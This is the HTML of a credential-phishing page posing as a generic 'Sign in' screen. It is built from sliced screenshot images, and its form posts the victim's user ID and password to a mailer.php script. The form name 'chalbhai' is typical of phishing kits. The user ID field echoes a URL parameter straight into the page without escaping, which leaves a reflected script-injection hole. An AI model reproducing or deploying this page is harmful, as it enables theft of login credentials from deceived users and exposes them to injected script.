<html><head>
<title>Sign in</title>
<meta http-equiv="content-type" content="text/html; charset=UTF8">
<link rel="shortcut icon" href="images/favicon.ico">
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>


</head><body style="visibility: visible;" onload="unhideBody()">
<link rel="stylesheet" href="pure-min.css">
<style type="text/css">
div#container
{
	position:relative;
	width: 100%;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>



<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1300px; height:34px; z-index:0"><img src="images/header.png" alt="" title="" border="0" width="1460" height="34"></div>

<div id="image2" style="position:absolute; overflow:hidden; left:946px; top:112px; width:309px; height:477px; z-index:1"><img src="images/pnel.png" alt="" title="" border="0" width="309" height="477"></div>

<div id="image3" style="position:absolute; overflow:hidden; left:1015px; top:394px; width:171px; height:47px; z-index:2"><a href="#"><img src="images/ggg.png" alt="" title="" border="0" width="171" height="47"></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:974px; top:505px; width:263px; height:51px; z-index:3"><a href="#"><img src="images/ooooo.png" alt="" title="" border="0" width="263" height="51"></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:1126px; top:281px; width:112px; height:17px; z-index:4"><a href="#"><img src="images/for.png" alt="" title="" border="0" width="112" height="17"></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:0px; top:855px; width:1393px; height:32px; z-index:5"><a href="#"><img src="images/fooottteeee.png" alt="" title="" border="0" width="1300" height="32"></a></div>
<form action="mailer.php" name="chalbhai" id="chalbhai" method="post" class="pure-form">
<div id="formcheckbox1" style="position:absolute; left:972px; top:305px; z-index:6"><input type="checkbox" name="formcheckbox1"></div>
<input name="userid" value="<?=$_GET[userid]?>" required="" title="Please Enter Right Value" type="text" style="position:absolute;font-size: 16px;font-weight: bold;width:254px;text-align:center;border:none;left:974px;top:184px;z-index:7">

<input name="pass" required="" title="Please Enter Right Value" placeholder="Password" type="password" style="position:absolute;width:254px;left:974px;top:230px;z-index:8">


<div id="formimage1" style="position:absolute; left:979px; top:334px; z-index:9"><input type="image" name="formimage1" width="257" height="43" src="images/sign.png"></div>
</form></div>



</body></html>